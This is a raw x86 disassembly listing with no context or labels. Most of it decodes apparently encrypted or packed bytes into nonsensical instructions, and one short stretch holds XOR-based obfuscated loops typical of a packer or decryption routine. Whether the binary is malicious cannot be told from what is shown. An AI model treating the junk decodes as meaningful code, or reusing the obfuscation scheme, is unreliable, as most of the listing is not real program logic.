  40eefa:	ret    0xb564
  40eefd:	xor    esi,DWORD PTR [edi]
  40eeff:	pop    ecx
  40ef00:	iret   
  40ef01:	lds    edi,FWORD PTR [ebp+0x4c]
  40ef04:	dec    ecx
  40ef05:	inc    ecx
  40ef06:	adc    al,0x6d
  40ef08:	xchg   esi,eax
  40ef09:	inc    ebp
  40ef0a:	(bad)  
  40ef0e:	jb     0x40ef01
  40ef10:	bound  esi,QWORD PTR [eax+0x4201e61a]
  40ef16:	push   ecx
  40ef17:	push   edi
  40ef18:	and    DWORD PTR [ecx],ebp
  40ef1a:	adc    al,0x69
  40ef1c:	inc    edi
  40ef1d:	push   edx
  40ef1e:	mov    al,0xc7
  40ef20:	push   es
  40ef21:	test   al,0xbf
  40ef23:	icebp  
  40ef24:	push   es
  40ef25:	(bad)  
  40ef26:	call   0x14126045
  40ef2b:	jae    0x40ef9e
  40ef2d:	inc    eax
  40ef2e:	or     al,0x26
  40ef30:	and    eax,0xe88c746d
  40ef35:	out    0xa0,al
  40ef37:	adc    DWORD PTR [ecx-0x944b3f4],eax
  40ef3d:	sub    DWORD PTR [edx+0x74],edx
  40ef40:	and    dl,BYTE PTR [esi+ebx*2-0x778949b0]
  40ef47:	rcl    DWORD PTR [edx-0x1],cl
  40ef4a:	ret    
  40ef4b:	jmp    0x26d0:0x7635387b
  40ef52:	inc    ebp
  40ef53:	pop    ss
  40ef54:	sbb    BYTE PTR [edi-0x73],ch
  40ef57:	mov    dl,0x6c
  40ef59:	jmp    0x820991bb
  40ef5e:	mov    eax,ds:0xb52542f5
  40ef63:	sar    bh,1
  40ef65:	iret   
  40ef66:	inc    eax
  40ef67:	inc    esp
  40ef68:	fs push cs
  40ef6a:	das    
  40ef6b:	int3   
  40ef6c:	add    dl,BYTE PTR [ecx+0x65]
  40ef6f:	stc    
  40ef70:	xlat   BYTE PTR ds:[ebx]
  40ef71:	push   ds
  40ef72:	popa   
  40ef73:	fdivp  st(5),st
  40ef75:	jo     0x40ef7a
  40ef77:	data16 (bad) 
  40ef79:	out    0xbe,al
  40ef7b:	adc    esp,edx
  40ef7d:	outs   dx,BYTE PTR ds:[esi]
  40ef7e:	popa   
  40ef7f:	enter  0xb6c,0x44
  40ef83:	mov    ebp,0x22558304
  40ef88:	fmul   QWORD PTR [ebp+eax*4+0x6dbc34da]
  40ef8f:	popf   
  40ef90:	sub    eax,0x322298d3
  40ef95:	ins    DWORD PTR es:[edi],dx
  40ef96:	hlt    
  40ef97:	jp     0x40efbc
  40ef99:	sub    eax,DWORD PTR ds:0xdb9af13e
  40ef9f:	or     al,cl
  40efa1:	jle    0x40efa3
  40efa3:	add    eax,0xe6156346
  40efa8:	loop   0x40eff4
  40efaa:	lods   al,BYTE PTR ds:[esi]
  40efab:	mov    bl,0x56
  40efad:	inc    edi
  40efae:	or     DWORD PTR [eax+0x4349e0f6],edi
  40efb4:	push   ebx
  40efb5:	add    al,0x87
  40efb7:	(bad)  
  40efb9:	(bad)  
  40efba:	shl    edx,cl
  40efbc:	mov    ds:0x97ef0a18,al
  40efc1:	or     BYTE PTR [edx+edi*4+0x35],bh
  40efc5:	pop    ecx
  40efc6:	cmc    
  40efc7:	push   ecx
  40efc8:	mov    ebx,0xb4eff4e
  40efcd:	int3   
  40efce:	cli    
  40efcf:	call   0x2dc3:0x6c9e744b
  40efd6:	mov    ebp,ebx
  40efd8:	and    DWORD PTR [ebp+0x5cd7bf41],0x8c59590b
  40efe2:	dec    edi
  40efe3:	ret    0x3cf
  40efe6:	jnp    0x40efc7
  40efe8:	dec    edx
  40efe9:	vandpd xmm0,xmm4,xmm5
  40efed:	and    al,0xb2
  40efef:	icebp  
  40eff0:	(bad)  
  40eff1:	fwait
  40eff2:	in     al,0x6a
  40eff4:	aam    0x5b
  40eff6:	(bad)  
  40eff7:	add    bh,BYTE PTR [ecx-0x414ffc21]
  40effd:	xlat   BYTE PTR ds:[ebx]
  40effe:	sbb    DWORD PTR [edx],ecx
  40f000:	arpl   WORD PTR [edx+0x59],cx
  40f003:	retf   
  40f004:	push   ds
  40f005:	fimul  DWORD PTR [esi]
  40f007:	cs jo  0x40f024
  40f00a:	or     edx,edi
  40f00c:	jo     0x40f052
  40f00e:	xor    BYTE PTR [esi],bl
  40f010:	sbb    dh,BYTE PTR [ecx+edi*1]
  40f013:	sub    ecx,DWORD PTR [di]
  40f016:	jae    0x40efac
  40f018:	push   es
  40f019:	nop
  40f01a:	jae    0x40f02c
  40f01c:	arpl   WORD PTR [ecx+0x6a],si
  40f01f:	dec    ecx
  40f020:	scas   eax,DWORD PTR es:[edi]
  40f021:	arpl   WORD PTR [esi],bx
  40f023:	push   esi
  40f024:	cmp    al,0xb3
  40f026:	shl    DWORD PTR [esi],1
  40f028:	cmp    BYTE PTR [ebx-0x4026757a],dh
  40f02e:	sti    
  40f02f:	xchg   WORD PTR [edi],bx
  40f032:	sbb    eax,0x1e25dea0
  40f037:	mov    al,0xb
  40f039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f03a:	mov    eax,0xf1917f9d
  40f03f:	and    BYTE PTR [ecx-0x5f],ch
  40f042:	and    edi,ebp
  40f044:	fcom   DWORD PTR [ecx-0x18]
  40f047:	popa   
  40f048:	mov    ecx,0xe2f9feb1
  40f04d:	mov    bl,0xb
  40f04f:	nop
  40f050:	jbe    0x40f007
  40f052:	lods   al,BYTE PTR ds:[esi]
  40f053:	les    edx,FWORD PTR [ecx+0x77]
  40f056:	xchg   edi,eax
  40f057:	or     BYTE PTR [eax+edi*4-0x1f],al
  40f05b:	push   ds
  40f05c:	and    cx,cx
  40f05f:	pop    di
  40f061:	mov    WORD PTR [bp+di+0xbe],es
  40f066:	pop    ss
  40f067:	add    ebp,ebp
  40f069:	jne    0x40f016
  40f06b:	or     edi,DWORD PTR [ebp-0x11]
  40f06e:	stos   BYTE PTR es:[di],al
  40f070:	iret   
  40f071:	mov    edi,0x3478aed3
  40f076:	push   ss
  40f077:	xchg   ecx,eax
  40f078:	push   edx
  40f079:	sub    DWORD PTR [eax],0xe3ca0ba0
  40f07f:	mov    ch,0xe3
  40f081:	iret   
  40f082:	sbb    edi,eax
  40f084:	(bad)  
  40f085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f086:	jae    0x40f0ff
  40f088:	xchg   ebx,eax
  40f089:	xchg   DWORD PTR [edi],edi
  40f08b:	mov    ch,cl
  40f08d:	mov    esi,0x1b28f3c3
  40f092:	xchg   ebp,eax
  40f093:	nop
  40f094:	push   edx
  40f095:	test   BYTE PTR ds:[ebx-0x56],dh
  40f099:	or     eax,0xa91c5e35
  40f09e:	push   es
  40f09f:	cmc    
  40f0a0:	mov    ebx,0x98b02ac3
  40f0a5:	adc    DWORD PTR [eax],edi
  40f0a7:	ins    BYTE PTR es:[edi],dx
  40f0a8:	mov    bl,0xa
  40f0aa:	xchg   ebp,eax
  40f0ab:	out    dx,al
  40f0ac:	inc    ecx
  40f0ad:	stos   DWORD PTR es:[edi],eax
  40f0ae:	add    eax,0x48266ff1
  40f0b3:	pop    ds
  40f0b4:	lods   eax,DWORD PTR ds:[esi]
  40f0b5:	push   eax
  40f0b6:	addr16 enter 0x47dc,0x79
  40f0bb:	sbb    esi,DWORD PTR [ebx+0x3c942816]
  40f0c1:	inc    edx
  40f0c2:	dec    ecx
  40f0c3:	push   ebx
  40f0c4:	cmp    BYTE PTR [edi+0x2e],0x32
  40f0c8:	jne    0x40f097
  40f0ca:	inc    edx
  40f0cb:	mov    edi,0x56f60805
  40f0d0:	adc    BYTE PTR [esp+esi*2-0x32],al
  40f0d4:	dec    edi
  40f0d5:	out    dx,eax
  40f0d6:	and    BYTE PTR [esi+0x6fbb089a],0xec
  40f0dd:	fmul   QWORD PTR [edx]
  40f0df:	lea    ecx,[ebx-0x2d]
  40f0e2:	xor    ebp,DWORD PTR ds:0x54a167ca
  40f0e8:	adc    BYTE PTR [esi],ch
  40f0ea:	inc    ebx
  40f0eb:	loop   0x40f079
  40f0ed:	xor    eax,0xfdfa62a2
  40f0f2:	add    BYTE PTR [ebp+0x7e62ab88],dl
  40f0f8:	dec    ecx
  40f0f9:	ret    
  40f0fa:	into   
  40f0fb:	and    eax,0x1cabd37b
  40f100:	pop    es
  40f101:	or     DWORD PTR [ebp+0x5f154a64],0xca1d2abb
  40f10b:	std    
  40f10c:	dec    esp
  40f10d:	mov    ds:0xcbfb3f8a,al
  40f112:	sbb    eax,0xd5abc683
  40f117:	sahf   
  40f118:	inc    DWORD PTR [ebp-0xf]
  40f11b:	stos   BYTE PTR es:[edi],al
  40f11c:	xor    al,0x88
  40f11e:	inc    edi
  40f11f:	out    dx,al
  40f120:	call   0x23c8b72c
  40f125:	xor    bh,BYTE PTR [ebp+0x48]
  40f128:	sub    DWORD PTR [edx-0x2c],edi
  40f12b:	addr16 xchg edx,eax
  40f12d:	xor    bh,BYTE PTR [esi+0x7c4e234a]
  40f133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f134:	aaa    
  40f135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f136:	and    DWORD PTR [edx+0x483916a6],edi
  40f13c:	cmp    esi,DWORD PTR [ebp-0x2c]
  40f13f:	jp     0x40f1b3
  40f141:	cmp    ebx,DWORD PTR [edx+eiz*2]
  40f144:	xchg   ecx,eax
  40f145:	cmp    edx,DWORD PTR [ecx]
  40f147:	repz (bad) 
  40f149:	push   cs
  40f14a:	aaa    
  40f14b:	add    ecx,DWORD PTR [ebp-0x222b0a81]
  40f151:	je     0x40f1c6
  40f153:	scas   eax,DWORD PTR es:[edi]
  40f154:	xor    al,0xab
  40f156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f157:	mov    eax,0x2bff7ea5
  40f15c:	and    al,al
  40f15e:	aad    0xe7
  40f160:	inc    ebp
  40f161:	fwait
  40f162:	ins    DWORD PTR es:[edi],dx
  40f163:	in     al,dx
  40f164:	lahf   
  40f165:	sbb    al,0x2e
  40f167:	popf   
  40f168:	stos   DWORD PTR es:[edi],eax
  40f169:	(bad)  
  40f16a:	mov    ebp,0x2bf372d8
  40f16f:	int3   
  40f170:	sub    DWORD PTR [eax-0x4a1ffa9a],ebp
  40f176:	clc    
  40f177:	mov    eax,0x5a06556d
  40f17c:	fbld   TBYTE PTR [eax-0x737f2ede]
  40f182:	pop    ebp
  40f183:	sbb    eax,0xd9ee69f1
  40f188:	mov    DWORD PTR [edx-0x392ab7bf],esp
  40f18e:	add    al,0x56
  40f190:	cmp    eax,0x8db61fc8
  40f195:	push   0xb124db77
  40f19a:	leave  
  40f19b:	sbb    eax,0x40ff0a18
  40f1a0:	push   ecx
  40f1a1:	jo     0x40f1ba
  40f1a3:	inc    ebp
  40f1a4:	mov    eax,ds:0xe3ce1ac7
  40f1a9:	sub    DWORD PTR [eax-0x65],ecx
  40f1ac:	stc    
  40f1ad:	pop    esi
  40f1ae:	or     eax,0x1e67f0cc
  40f1b3:	call   0x2b85:0x9ed66e37
  40f1ba:	stos   DWORD PTR es:[edi],eax
  40f1bb:	imul   esp,DWORD PTR [ecx],0x5c9bc8c1
  40f1c1:	mov    ds:0xf6ade1ce,eax
  40f1c6:	add    bh,dl
  40f1c8:	in     eax,0x5b
  40f1ca:	sub    BYTE PTR [edx+0x35],0x74
  40f1ce:	xor    BYTE PTR ds:0x39f20f98,ch
  40f1d4:	mov    dl,0x2b
  40f1d6:	sub    al,0x64
  40f1d8:	ret    
  40f1d9:	add    ecx,DWORD PTR [ebp+0x61faf1e8]
  40f1df:	xchg   ah,dl
  40f1e1:	std    
  40f1e2:	cmp    eax,0xce0ef937
  40f1e7:	or     DWORD PTR [ebp+0x2466ea39],esp
  40f1ed:	add    al,0xcd
  40f1ef:	jne    0x40f205
  40f1f1:	cmc    
  40f1f2:	mov    ch,0x48
  40f1f4:	inc    edi
  40f1f5:	xlat   BYTE PTR ds:[ebx]
  40f1f6:	xor    al,0x98
  40f1f8:	xchg   ebx,eax
  40f1f9:	fincstp 
  40f1fb:	sub    DWORD PTR cs:[ebx],esi
  40f1fe:	es ss mov edx,0xa3328ec7
  40f205:	pop    es
  40f206:	push   0x63
  40f208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f209:	mov    ch,0x7c
  40f20b:	fstp   DWORD PTR ds:0x8a51c940
  40f211:	mov    eax,ds:0xa31f8565
  40f216:	or     bl,BYTE PTR [ebx]
  40f218:	push   edx
  40f219:	sbb    BYTE PTR es:[ecx+0x2b],cl
  40f21d:	shl    BYTE PTR ds:0x5ddd5929,0x61
  40f224:	mov    bl,0x3
  40f226:	jno    0x40f228
  40f228:	add    eax,0xee8a5d08
  40f22d:	fwait
  40f22e:	pop    ss
  40f22f:	sbb    al,0xc9
  40f231:	jle    0x40f1f0
  40f233:	cmp    eax,0x721c342d
  40f238:	fs mov ebx,0x2471a42f
  40f23e:	jbe    0x40f21c
  40f240:	stos   BYTE PTR es:[edi],al
  40f241:	mov    ecx,0xd061827f
  40f246:	into   
  40f247:	rcl    BYTE PTR [eax],0x30
  40f24a:	outs   dx,BYTE PTR ds:[esi]
  40f24b:	xor    DWORD PTR [eax-0x65],ebp
  40f24e:	xchg   esp,eax
  40f24f:	call   0x82d:0xeb29d11
  40f256:	and    eax,0xc795175e
  40f25b:	push   ds
  40f25c:	jecxz  0x40f2cc
  40f25e:	fs jl  0x40f245
  40f261:	or     al,0x7c
  40f263:	sbb    al,0xb9
  40f265:	fcomp  DWORD PTR [ebx-0x49f3f787]
  40f26b:	mov    bl,0x72
  40f26d:	pop    esp
  40f26e:	adc    eax,0xf4323c42
  40f273:	dec    edi
  40f274:	ins    BYTE PTR es:[edi],dx
  40f275:	das    
  40f276:	pop    es
  40f277:	call   0xdefebf96
  40f27c:	xchg   ecx,eax
  40f27d:	add    al,dl
  40f27f:	push   es
  40f280:	xor    eax,0x4999418c
  40f285:	xor    ebx,esi
  40f287:	inc    edi
  40f288:	enter  0x9ce7,0xb9
  40f28c:	sub    ah,BYTE PTR [ebx+0x3278e7d]
  40f292:	xor    BYTE PTR [edi+0x787d7a04],dl
  40f298:	out    dx,al
  40f299:	adc    DWORD PTR [ebp+0x3e],ebp
  40f29c:	mov    ch,0x5d
  40f29e:	cmp    edx,eax
  40f2a0:	ret    
  40f2a1:	mov    bl,0xf9
  40f2a3:	(bad)  
  40f2a5:	ficom  DWORD PTR [eax-0x50e4231a]
  40f2ab:	scas   eax,DWORD PTR es:[edi]
  40f2ac:	js     0x40f2a0
  40f2ae:	xchg   ebx,eax
  40f2af:	adc    bl,0x78
  40f2b2:	dec    edx
  40f2b3:	shl    BYTE PTR [edi],1
  40f2b5:	jmp    0x40f2d6
  40f2b7:	and    BYTE PTR [esi],cl
  40f2b9:	in     al,dx
  40f2ba:	cli    
  40f2bb:	sbb    ebx,DWORD PTR [ebp+0xd]
  40f2be:	cmc    
  40f2bf:	retf   
  40f2c0:	cmp    edx,DWORD PTR [ebp+ebp*4+0x639a72d6]
  40f2c7:	icebp  
  40f2c8:	jge    0x40f290
  40f2ca:	repnz inc ebp
  40f2cc:	push   ecx
  40f2cd:	mov    esp,0xae013cc
  40f2d2:	xchg   edx,eax
  40f2d3:	push   edx
  40f2d4:	add    al,0xc8
  40f2d6:	jecxz  0x40f2b7
  40f2d8:	repz cmp ah,BYTE PTR [esi-0x6b2698a]
  40f2df:	inc    esp
  40f2e0:	bsr    ebx,DWORD PTR [edi+0x3e6ccf48]
  40f2e7:	sub    eax,0x318fbe01
  40f2ec:	mov    esi,esp
  40f2ee:	jecxz  0x40f276
  40f2f0:	aad    0xac
  40f2f2:	jne    0x40f2b2
  40f2f4:	mov    WORD PTR [ebx+0x6f],es
  40f2f7:	xacquire xchg BYTE PTR [edx],dh
  40f2fa:	xchg   ebx,eax
  40f2fb:	push   ebp
  40f2fc:	data16 rep lods al,BYTE PTR ds:[esi]
  40f2ff:	loope  0x40f314
  40f301:	mov    ds:0x8552e07b,al
  40f306:	aas    
  40f307:	push   esp
  40f308:	in     al,0xc5
  40f30a:	in     al,0x4f
  40f30c:	pop    ebp
  40f30d:	sbb    eax,0xf63ae7a6
  40f312:	les    ebx,FWORD PTR [edi+0x64a5b98c]
  40f318:	shl    BYTE PTR [ebx-0x36],cl
  40f31b:	mov    esp,0xd645c72c
  40f320:	div    DWORD PTR [edi+0x0]
  40f323:	pop    es
  40f324:	cli    
  40f325:	mov    ch,BYTE PTR [edx+esi*4+0x48]
  40f329:	mov    al,0xe2
  40f32b:	iret   
  40f32c:	push   edx
  40f32d:	test   eax,0x1d343d44
  40f332:	lods   al,BYTE PTR ds:[esi]
  40f333:	loope  0x40f30e
  40f335:	fsub   DWORD PTR [esi-0x1561c4e5]
  40f33b:	fild   DWORD PTR [esi-0x2]
  40f33e:	or     BYTE PTR [ecx],bh
  40f340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f341:	out    0x93,eax
  40f343:	aas    
  40f344:	sbb    BYTE PTR ds:[edx-0x1b31f1aa],0x71
  40f34c:	stc    
  40f34d:	push   ecx
  40f34e:	push   ecx
  40f34f:	sub    eax,DWORD PTR [esi+0x49]
  40f352:	out    0x82,eax
  40f354:	mov    bh,BYTE PTR [ebx-0x2d]
  40f357:	dec    ebx
  40f358:	stc    
  40f359:	in     eax,dx
  40f35a:	pop    ebx
  40f35b:	ins    DWORD PTR es:[edi],dx
  40f35c:	shl    DWORD PTR [ecx],0xe7
  40f35f:	ror    ecx,0x60
  40f362:	fsub   st,st(4)
  40f364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f365:	add    BYTE PTR [edi],ah
  40f367:	js     0x40f3a6
  40f369:	hlt    
  40f36a:	mov    al,ds:0xa51da50f
  40f36f:	sub    bh,bl
  40f371:	xor    DWORD PTR [edi+0x5a6baba4],esi
  40f377:	fcom   QWORD PTR [esi+0x3d]
  40f37a:	mov    ebx,0x16ca8ff7
  40f37f:	inc    ecx
  40f380:	mov    ebx,DWORD PTR [edx]
  40f382:	xor    edi,ebx
  40f384:	mov    DWORD PTR [edx],edi
  40f386:	mov    edx,DWORD PTR [ebp+0x8]
  40f389:	xor    edx,eax
  40f38b:	inc    ecx
  40f38c:	inc    DWORD PTR [ebp-0x18]
  40f38f:	add    edx,esi
  40f391:	cmp    ecx,edx
  40f393:	jb     0x40cfd4
  40f399:	jmp    0x40f3e3
  40f39e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3a1:	mov    DWORD PTR [ebp+0x8],ecx
  40f3a4:	jmp    0x40f3d6
  40f3a9:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3ac:	mov    edx,DWORD PTR [ebp-0x8]
  40f3af:	xor    ecx,eax
  40f3b1:	xor    edx,eax
  40f3b3:	sub    ecx,edx
  40f3b5:	sub    ecx,esi
  40f3b7:	xor    ecx,eax
  40f3b9:	mov    DWORD PTR [ebp+0x8],ecx
  40f3bc:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3bf:	mov    edx,DWORD PTR [ebp+0x8]
  40f3c2:	imul   edx,edx,0x5708f1
  40f3c8:	xor    ecx,eax
  40f3ca:	add    ecx,esi
  40f3cc:	lea    ecx,[ebp+ecx*4-0x64]
  40f3d0:	mov    edi,DWORD PTR [ecx]
  40f3d2:	add    edx,edi
  40f3d4:	mov    DWORD PTR [ecx],edx
  40f3d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3d9:	xor    ecx,eax
  40f3db:	add    ecx,esi
  40f3dd:	jne    0x40f3a9
  40f3e3:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3e6:	mov    DWORD PTR [ebp+0x8],ecx
  40f3e9:	jmp    0x40f41b
  40f3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3f1:	mov    edx,DWORD PTR [ebp-0x8]
  40f3f4:	xor    ecx,eax
  40f3f6:	xor    edx,eax
  40f3f8:	sub    ecx,edx
  40f3fa:	sub    ecx,esi
  40f3fc:	xor    ecx,eax
  40f3fe:	mov    DWORD PTR [ebp+0x8],ecx
  40f401:	mov    ecx,DWORD PTR [ebp+0x8]
  40f404:	mov    edx,DWORD PTR [ebp+0x8]
  40f407:	imul   edx,edx,0x5708f1
  40f40d:	xor    ecx,eax
  40f40f:	add    ecx,esi
  40f411:	lea    ecx,[ebp+ecx*4-0x64]
  40f415:	mov    edi,DWORD PTR [ecx]
  40f417:	add    edx,edi
  40f419:	mov    DWORD PTR [ecx],edx
  40f41b:	mov    ecx,DWORD PTR [ebp+0x8]
  40f41e:	xor    ecx,eax
  40f420:	add    ecx,esi
  40f422:	jne    0x40f3ee
  40f428:	mov    ecx,DWORD PTR [ebp-0x8]
  40f42b:	mov    edx,DWORD PTR [ebp-0x20]
  40f42e:	xor    ecx,eax
  40f430:	lea    ecx,[ecx+edx*1+0x3272dc]
  40f437:	mov    DWORD PTR [ebp-0x20],ecx
  40f43a:	inc    DWORD PTR [ebp+0xc]
  40f43d:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f440:	xor    ecx,eax
  40f442:	add    ecx,esi
  40f444:	jne    0x40ced6
  40f44a:	jmp    0x413be3
  40f44f:	mov    ecx,DWORD PTR [ebp-0xc]
  40f452:	mov    DWORD PTR [ebp+0x8],ecx
  40f455:	jmp    0x41180f
  40f45a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f45d:	mov    edx,DWORD PTR [ebp-0x8]
  40f460:	xor    ecx,eax
  40f462:	xor    edx,eax
  40f464:	sub    ecx,edx
  40f466:	jmp    0x4117ee
  40f46b:	mov    al,ds:0x7334f23d
  40f470:	cmp    ebp,DWORD PTR [edx+0x3e2d7a79]
  40f476:	mov    ds:0xf8434297,al
  40f47b:	pop    ebp
  40f47c:	int    0x7c
  40f47e:	jl     0x40f487
  40f480:	pop    edi
  40f481:	jl     0x40f4ff
  40f483:	int    0x48
  40f485:	xor    BYTE PTR [eax+0x42e901e8],ah
  40f48b:	or     DWORD PTR [esp+edx*8],edi
  40f48e:	and    DWORD PTR [ecx+0x126ffddb],edx
  40f494:	fndisi(8087 only) 
  40f496:	sub    eax,0x9b208c0c
  40f49b:	(bad)  
  40f49c:	lock mov bh,0x8b
  40f49f:	in     eax,dx
  40f4a0:	inc    edx
  40f4a1:	xor    eax,0xcd37c617
  40f4a6:	pop    edi
  40f4a7:	pop    ebx
  40f4a8:	shl    DWORD PTR [edx-0x3bd29dd2],cl
  40f4ae:	sub    ch,BYTE PTR [ebx]
  40f4b0:	test   ch,0x7b
  40f4b3:	cli    
  40f4b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4b5:	sub    DWORD PTR [edi],edx
  40f4b7:	into   
  40f4b8:	xor    al,0xce
  40f4ba:	pop    esp
  40f4bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4bc:	outs   dx,BYTE PTR ds:[esi]
  40f4bd:	cmp    dl,BYTE PTR [ebx]
  40f4bf:	xchg   edx,eax
  40f4c0:	sub    cl,bh
  40f4c2:	stos   DWORD PTR es:[edi],eax
  40f4c3:	lock inc esi
  40f4c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4c6:	fbstp  TBYTE PTR [esi+0x5338263e]
  40f4cc:	and    eax,0x3a2c939b
  40f4d1:	pop    ss
  40f4d2:	or     BYTE PTR [ebp+ebx*8-0x107d6a8a],al
  40f4d9:	and    eax,DWORD PTR [eax+0x56]
  40f4dc:	xchg   esi,eax
  40f4dd:	dec    eax
  40f4de:	mov    ah,0x67
  40f4e0:	aad    0xcc
  40f4e2:	cld    
  40f4e3:	and    dh,BYTE PTR [edi+0x529d7ea]
  40f4e9:	adc    esi,ebp
  40f4eb:	popf   
  40f4ec:	inc    ecx
  40f4ed:	lds    edi,FWORD PTR [edi+edi*4]
  40f4f0:	lea    ebp,ds:0x2e17743f
  40f4f6:	inc    edx
  40f4f7:	dec    edi
  40f4f8:	inc    ecx
  40f4f9:	push   0x40
  40f4fb:	pushf  
  40f4fc:	sub    cl,BYTE PTR [edi+0x2c]
  40f4ff:	sbb    esi,DWORD PTR [ecx]
  40f501:	push   ebp
  40f502:	xor    BYTE PTR [edx+0x11],ah
  40f505:	mov    DWORD PTR [ecx+0x63],ebx
  40f508:	addr16 lahf 
  40f50a:	shr    DWORD PTR [esi+ebx*8],0x2a
  40f50e:	ja     0x40f509
  40f510:	inc    ebp
  40f511:	sub    al,BYTE PTR [ebp+ecx*2-0x4]
  40f515:	pop    esi
  40f516:	and    eax,DWORD PTR [esi]
  40f518:	sbb    al,0x4c
  40f51a:	mov    ebp,ds
  40f51c:	fcom   QWORD PTR [edx+edi*1]
  40f51f:	addr16 or dl,dl
  40f522:	pop    ss
  40f523:	and    dh,ah
  40f525:	sub    BYTE PTR [ebx+0x18],al
  40f528:	xlat   BYTE PTR ds:[ebx]
  40f529:	push   ebp
  40f52a:	jb     0x40f4f8
  40f52c:	stos   BYTE PTR es:[edi],al
  40f52d:	add    al,0xab
  40f52f:	mov    ebp,0x93e85a20
  40f534:	xchg   edx,eax
  40f535:	lods   eax,DWORD PTR ds:[esi]
  40f536:	mov    bl,BYTE PTR [ecx]
  40f538:	pop    ds
  40f539:	sub    DWORD PTR [esi-0x13],ebx
  40f53c:	and    edi,ecx
  40f53e:	push   ebp
  40f53f:	addr16 pop edx
  40f541:	push   esp
  40f542:	shl    DWORD PTR [edi],0x71
  40f545:	imul   esp,edi,0x6c
  40f548:	push   ebp
  40f549:	jmp    0x40f571
  40f54b:	psrlq  mm2,QWORD PTR [edx]
  40f54e:	push   esi
  40f54f:	lahf   
  40f550:	repz dec eax
  40f552:	pop    es
  40f553:	xchg   esi,eax
  40f554:	push   edi
  40f555:	cmp    BYTE PTR gs:0x7c0ede1b,ah
  40f55c:	adc    al,0xe8
  40f55e:	and    al,0x67
  40f560:	dec    edx
  40f561:	adc    bl,al
  40f563:	mov    ch,0xf7
  40f565:	cmp    al,0xeb
  40f567:	mov    esp,0x2710c350
  40f56c:	dec    ebp
  40f56d:	fist   WORD PTR [edx]
  40f56f:	push   ebp
  40f570:	stos   DWORD PTR es:[edi],eax
  40f571:	into   
  40f572:	cmp    cl,BYTE PTR [eax+0x58]
  40f575:	test   DWORD PTR [ebx],esp
  40f577:	shl    BYTE PTR [edx-0x198fc6d4],0x17
  40f57e:	out    0x1c,eax
  40f580:	rcr    ah,0x1
  40f583:	dec    ebp
  40f584:	retf   0x7f72
  40f587:	sahf   
  40f588:	lea    esi,[eax]
  40f58a:	or     dh,BYTE PTR [edx-0x607cccc7]
  40f590:	xchg   ebp,eax
  40f591:	pop    esp
  40f592:	push   ds
  40f593:	bound  ebx,QWORD PTR ds:0xb9fc381c
  40f599:	mov    ch,0x95
  40f59b:	adc    BYTE PTR [esi+edx*2-0x34a0ea64],0x28
  40f5a3:	mov    ebx,0x5ca2911f
  40f5a8:	mul    dl
  40f5aa:	test   al,0x7d
  40f5ac:	inc    esp
  40f5ad:	fisubr DWORD PTR [ecx+0x78]
  40f5b0:	bound  esi,QWORD PTR [esi-0x79]
  40f5b3:	mov    ah,BYTE PTR [eax]
  40f5b5:	outs   dx,DWORD PTR ds:[esi]
  40f5b6:	xor    dl,ah
  40f5b8:	xchg   ecx,eax
  40f5b9:	push   esi
  40f5ba:	test   BYTE PTR [edx],ch
  40f5bc:	inc    edx
  40f5bd:	imul   ebp,ebx,0xffffffef
  40f5c0:	sbb    BYTE PTR [esi+0x19d76b00],0x5b
  40f5c7:	xchg   BYTE PTR [eax+0x4c065b5],ah
  40f5cd:	lahf   
  40f5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5cf:	cs fmulp st(0),st
  40f5d2:	jmp    0x86be:0xadf4dfd8
  40f5d9:	pop    ecx
  40f5da:	jns    0x40f5ce
  40f5dc:	ins    DWORD PTR es:[edi],dx
  40f5dd:	shl    DWORD PTR [ecx-0x28f9ab14],0x8f
  40f5e4:	shl    ebx,1
  40f5e6:	xchg   ecx,eax
  40f5e7:	jecxz  0x40f640
  40f5e9:	cmc    
  40f5ea:	cld    
  40f5eb:	cs ds pop esp
  40f5ee:	mov    eax,eax
  40f5f0:	lock call 0x3154:0x852c3353
  40f5f8:	dec    esi
  40f5f9:	call   0xeb1d:0x662f579f
  40f600:	call   0xf75b3caa
  40f605:	mov    WORD PTR [ebx+0x2c],fs
  40f608:	jp     0x40f5de
  40f60a:	pushf  
  40f60b:	add    ch,al
  40f60d:	mov    ah,0xf1
  40f60f:	stos   BYTE PTR es:[edi],al
  40f610:	(bad)  
  40f612:	or     DWORD PTR [eax+0x13f4ce1e],esi
  40f618:	dec    ebx
  40f619:	cmp    al,0xcb
  40f61b:	xlat   BYTE PTR ds:[ebx]
  40f61c:	sbb    al,0x83
  40f61e:	jne    0x40f60a
  40f620:	(bad)  
  40f621:	cmc    
  40f622:	div    DWORD PTR [ecx-0x17d9b923]
  40f628:	and    al,0x4a
  40f62a:	xchg   edi,eax
  40f62b:	out    dx,al
  40f62c:	pop    esi
  40f62d:	mov    ah,0xf3
  40f62f:	jb     0x40f616
  40f631:	dec    ecx
  40f632:	ja     0x40f608
  40f634:	cli    
  40f635:	rol    DWORD PTR [esi+0x58],0x4d
  40f639:	sbb    esi,DWORD PTR [esp+ecx*2-0x3b]
  40f63d:	cmp    ebp,DWORD PTR [esi]
  40f63f:	rol    BYTE PTR [ecx],1
  40f641:	sahf   
  40f642:	ins    BYTE PTR es:[edi],dx
  40f643:	cwde   
  40f644:	push   cs
  40f645:	mov    edi,0x70cbe792
  40f64a:	mov    esp,0x9e41037
  40f64f:	daa    
  40f650:	pushf  
  40f651:	test   DWORD PTR ss:[ebx-0x75a226be],esi
